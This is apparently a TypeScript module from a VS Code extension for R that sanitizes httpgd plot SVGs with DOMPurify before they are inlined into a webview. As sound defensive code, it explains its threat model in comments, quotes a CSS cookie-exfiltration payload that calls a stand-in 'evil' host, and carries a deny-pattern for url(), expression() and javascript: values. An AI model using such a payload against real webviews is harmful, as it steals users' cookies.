import DOMPurifyDefault from 'dompurify';
import type { DOMPurify } from 'dompurify';

/**
 * Resolve a usable DOMPurify instance.
 *
 * In the webview (real browser context), the default export is already
 * initialized against `window` — `.sanitize` is callable directly.
 *
 * In Bun + jsdom tests (no real browser), the default export is the
 * factory: a function that takes a `WindowLike` and returns the
 * initialized instance. We detect that and invoke it with the global
 * `window` the test setup installs.
 *
 * Resolved once and memoized so we don't re-invoke the factory on
 * every call.
 */
let _dompurify: DOMPurify | null = null;
function get_dompurify(): DOMPurify {
    if (_dompurify) return _dompurify;
    const candidate = DOMPurifyDefault as unknown as
        | DOMPurify
        | ((root: unknown) => DOMPurify);
    if (typeof (candidate as DOMPurify).sanitize === 'function') {
        _dompurify = candidate as DOMPurify;
    } else if (typeof candidate === 'function') {
        const win = (globalThis as { window?: unknown }).window ?? globalThis;
        _dompurify = (candidate as (root: unknown) => DOMPurify)(win);
    } else {
        throw new Error('sanitize_svg: could not resolve a DOMPurify instance');
    }
    return _dompurify;
}

/**
 * Sanitize an SVG document fetched from httpgd before injecting it into
 * the webview via `{@html ...}`. Inline SVG content lives in the same
 * document as the webview's CSS, so a malicious R user emitting
 * `<script>`, event-handler attributes, or CSS-exfiltration vectors
 * could exploit the webview if the content reached the DOM unfiltered.
 *
 * Threat model: the user runs R code; an R session can already exfil
 * data or RCE on the host, so this is defense-in-depth, not a primary
 * security boundary. Still, the cost is low and the value is real.
 *
 * Configuration choices (kept in lockstep with the spec at
 * `docs/superpowers/specs/2026-05-25-plot-viewer-vscode-theme-toggle-design.md`,
 * §Sanitization):
 *
 *  - `USE_PROFILES: { svg: true, svgFilters: true }`: enable the SVG and
 *    SVG-filter element/attribute allowlists. Default profile would
 *    pass HTML elements through, which we don't want.
 *
 *  - `FORBID_TAGS`: deny five SVG-profile-permitted elements httpgd
 *    never emits but which carry real attack surface:
 *      - `<use>` / `<image>` / `<feImage>`: can reference external
 *        resources via href / xlink:href.
 *      - `<a>`: SVG-specific click semantics interfere with the right-
 *        click → Copy contextmenu handler on the plot host div.
 *      - `<style>`: CSS-exfiltration via `@import url(...)` — the
 *        sister channel to inline `style=` attrs.
 *      - `<foreignObject>`: hosts arbitrary HTML inside SVG, far wider
 *        attack surface than SVG itself.
 *
 *  - `FORBID_ATTR: ['style']`: the load-bearing line. The panel CSP
 *    keeps `style-src 'unsafe-inline'` (required for Svelte scoped
 *    styles), so a `<rect style="background:url(//evil/?cookie)">`
 *    could exfiltrate via CSS request. httpgd actually emits its
 *    colors as inline `style="fill: #...; stroke: #..."` declarations
 *    (NOT as `fill=`/`stroke=` attributes), so we run a preprocessing
 *    pass that migrates the safe presentation-property subset out of
 *    `style=` into proper attributes before DOMPurify strips what
 *    remains. See `migrate_inline_styles_to_attributes`.
 *
 *  - We intentionally do NOT add `class` / `xmlns` / `viewBox` to
 *    `ADD_ATTR`. The SVG profile already preserves them by default;
 *    adding them was a misleading "forward-compat" claim in an earlier
 *    spec revision. The real guard against a future DOMPurify profile
 *    change is the regression test in
 *    `tests/bun/plot-webview-sanitize.test.ts` asserting that
 *    `<svg class="httpgd">` survives sanitization with class and
 *    viewBox intact.
 *
 * Pinned to dompurify@3.4.5 — record the version in
 * `editors/vscode/package.json` (NOT the root) so an unintended bump
 * can't silently relax these protections.
 */
/**
 * SVG presentation properties safe to migrate from inline `style=` into
 * the matching attribute. Every entry produces no network requests and
 * no script execution at the property level — the value still gets a
 * per-declaration `UNSAFE_VALUE_RE` screen to drop anything that snuck
 * a `url(...)`, `expression(...)`, `javascript:`, or `@`-rule into a
 * place CSS happens to permit it.
 *
 * Limited to the subset httpgd actually emits today (fill/stroke/
 * font/opacity) plus a handful of close relatives so a future httpgd
 * tweak doesn't silently lose colors. Keep this list narrow — every
 * addition must be a property that is (a) a real SVG presentation
 * attribute and (b) cannot reference an external resource.
 */
const SAFE_STYLE_PROPS: ReadonlySet<string> = new Set([
    'fill', 'fill-opacity', 'fill-rule',
    'stroke', 'stroke-width', 'stroke-linecap', 'stroke-linejoin',
    'stroke-dasharray', 'stroke-dashoffset', 'stroke-miterlimit', 'stroke-opacity',
    'opacity',
    'font-size', 'font-family', 'font-style', 'font-weight', 'font-variant',
    'text-anchor', 'dominant-baseline', 'alignment-baseline',
    'color', 'visibility',
]);

/**
 * Reject any CSS value containing a network-fetching function call,
 * a CSS at-rule, a JavaScript URL, or a CSS expression. Case-insensitive
 * because CSS keywords are.
 */
const UNSAFE_VALUE_RE = /url\s*\(|expression\s*\(|javascript:|@/i;

/**
 * HTML-escape characters that would otherwise break out of a
 * double-quoted attribute value. We do not entity-escape `>` because
 * SVG attribute values may legitimately contain `>` once double-quoted,
 * but we escape `<` defensively in case a declaration value contained
 * an embedded tag-looking fragment (it shouldn't, but better safe).
 */
function escape_attr_value(value: string): string {
    return value
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;');
}

/**
 * Migrate the `style="prop: val; ..."` declarations httpgd uses into
 * separate SVG presentation attributes for the safe subset. Any
 * declaration whose property isn't in `SAFE_STYLE_PROPS`, or whose
 * value matches `UNSAFE_VALUE_RE`, is dropped silently. The original
 * `style=` attribute is removed entirely; DOMPurify's `FORBID_ATTR`
 * then has nothing left to strip on the safe path.
 *
 * Why preprocessing (not a DOMPurify hook): the regex-based migration
 * runs in linear time over the SVG text without instantiating a DOM
 * twice, and it's testable in isolation. The two-pass approach also
 * keeps the sanitize step ignorant of httpgd specifics — DOMPurify's
 * config is still the security-relevant surface.
 *
 * Quote handling: httpgd emits both `style="..."` and `style='...'`
 * forms; the second form often contains an inner `"Arial"` font-family
 * value. We match each quote style with its own regex so the inner
 * quote can never terminate the match early.
 */
function migrate_inline_styles_to_attributes(svgText: string): string {
    const convert = (declarations: string): string => {
        const attrs: string[] = [];
        for (const decl of declarations.split(';')) {
            const colon = decl.indexOf(':');
            if (colon < 0) continue;
            const prop = decl.slice(0, colon).trim().toLowerCase();
            const value = decl.slice(colon + 1).trim();
            if (!prop || !value) continue;
            if (!SAFE_STYLE_PROPS.has(prop)) continue;
            if (UNSAFE_VALUE_RE.test(value)) continue;
            attrs.push(`${prop}="${escape_attr_value(value)}"`);
        }
        return attrs.length === 0 ? '' : ' ' + attrs.join(' ');
    };
    // Two passes because a single character-class regex can't express
    // "this quote OR that quote, but not the other one inside" — splitting
    // by quote lets the inner-quote case (font-family: "Arial" inside
    // `style='...'`) match cleanly.
    return svgText
        .replace(/\sstyle="([^"]*)"/gi, (_m, decls) => convert(decls))
        .replace(/\sstyle='([^']*)'/gi, (_m, decls) => convert(decls));
}

/**
 * DOMPurify config shared between the webview and the Knit Preview's
 * host-side SVG inlining pipeline. Keep these flags in lockstep with the
 * documentation block above (`Configuration choices`) and with the
 * regression test in `tests/bun/plot-webview-sanitize.test.ts`.
 */
// DOMPurify clones the config internally before use, so this object is
// safe to share across calls. Kept as a function (not a `const`) because
// the FORBID_TAGS/FORBID_ATTR arrays are typed as `string[]` rather than
// readonly tuples by the DOMPurify Config type — returning a fresh
// literal each time avoids fighting the `as const` vs mutable-array
// inference.
function svgSanitizeConfig() {
    return {
        USE_PROFILES: { svg: true, svgFilters: true },
        FORBID_TAGS: ['use', 'image', 'a', 'style', 'foreignObject', 'feImage'],
        FORBID_ATTR: ['style'],
    };
}

function sanitize_with_dompurify(text: string, dp: DOMPurify): string {
    // Pre-migrate httpgd's inline style declarations into SVG attribute
    // form so the colors and fonts survive DOMPurify's `FORBID_ATTR`
    // pass. Without this, every fill/stroke/font is stripped, the SVG
    // renders in default paint (black on transparent), and on a dark
    // VS Code theme the plot is effectively invisible until the
    // "Apply VS Code theme" overlay forces a foreground color.
    const preprocessed = migrate_inline_styles_to_attributes(text);
    const out = dp.sanitize(preprocessed, svgSanitizeConfig());
    // DOMPurify's `sanitize` can return a TrustedHTML object on
    // platforms with Trusted Types; coerce to string so the caller's
    // `{@html}` consumer always receives a primitive.
    return typeof out === 'string' ? out : String(out);
}

export function sanitize_svg(text: string): string {
    return sanitize_with_dompurify(text, get_dompurify());
}

/**
 * Build a reusable SVG sanitizer bound to the given window. Used by the
 * Knit Preview's host-side SVG inlining pipeline, which runs in Node.js
 * with a jsdom-provided window. The webview path keeps using
 * `sanitize_svg` (globalThis-backed) unchanged.
 *
 * A single Knit Preview render typically contains 0–N plot SVGs; reusing
 * the DOMPurify instance across the batch saves the factory call per
 * plot. The webview path's threat model already justifies the sanitize
 * pass — see the module docstring above for the full configuration
 * rationale.
 */
export function create_svg_sanitizer(win: unknown): (text: string) => string {
    const factory = DOMPurifyDefault as unknown as (root: unknown) => DOMPurify;
    if (typeof factory !== 'function') {
        throw new Error('create_svg_sanitizer: DOMPurify default export is not a factory.');
    }
    const dp = factory(win);
    return (text) => sanitize_with_dompurify(text, dp);
}
